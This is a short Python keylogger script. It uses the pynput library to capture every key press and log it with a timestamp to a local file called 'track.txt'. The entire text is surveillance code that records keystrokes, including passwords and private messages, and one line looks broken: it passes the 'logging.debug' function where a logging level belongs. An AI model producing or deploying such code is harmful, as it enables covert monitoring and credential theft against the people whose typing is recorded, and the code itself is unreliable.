from pynput.keyboard import *
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir+'track.txt'),level=logging.debug, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()